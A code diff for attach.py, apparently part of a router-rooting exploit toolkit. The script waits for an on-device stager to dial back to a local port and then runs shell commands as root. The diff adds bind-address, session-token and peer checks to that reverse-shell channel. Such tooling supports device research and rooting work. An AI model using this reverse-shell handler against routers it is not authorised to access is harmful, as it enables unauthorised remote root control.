@@ -6,8 +6,10 @@ stays up, so losing the driver does not lose root -- only a reboot does.  That
 matters because the trigger is one-shot: without this, a driver bug costs a
 factory reset and a fresh exploit run to get back to the same place.
 
-    python3 attach.py 'cat /proc/mtd' 'nvram get flash_type'
-    python3 attach.py -f commands.txt
+    python3 attach.py --bind 192.168.31.231 \
+        --session-token TOKEN_FROM_RESUME_JSON 'cat /proc/mtd'
+    python3 attach.py --bind 192.168.31.231 \
+        --session-token TOKEN_FROM_RESUME_JSON -f commands.txt
 """
 
 import argparse
@@ -22,6 +24,12 @@ def main():
     ap.add_argument("commands", nargs="*")
     ap.add_argument("-f", "--file", help="read commands from a file, one per line")
     ap.add_argument("--shell-port", type=int, default=4444)
+    ap.add_argument("--bind", required=True,
+                    help="local address embedded in the original stager")
+    ap.add_argument("--peer", default="192.168.31.1",
+                    help="expected router source address")
+    ap.add_argument("--session-token", required=True,
+                    help="token recorded in the original run's resume.json")
     ap.add_argument("--timeout", type=int, default=300)
     ap.add_argument("--cmd-timeout", type=int, default=120)
     args = ap.parse_args()
@@ -34,7 +42,8 @@ def main():
     if not cmds:
         ap.error("give at least one command, or -f")
 
-    ch = channel.ShellChannel(args.shell_port)
+    ch = channel.ShellChannel(
+        args.bind, args.shell_port, args.session_token, args.peer)
     log(f"[*] waiting up to {args.timeout}s for the stager to dial in "
         "(it retries every 5s)")
     if not ch.wait(timeout=args.timeout):
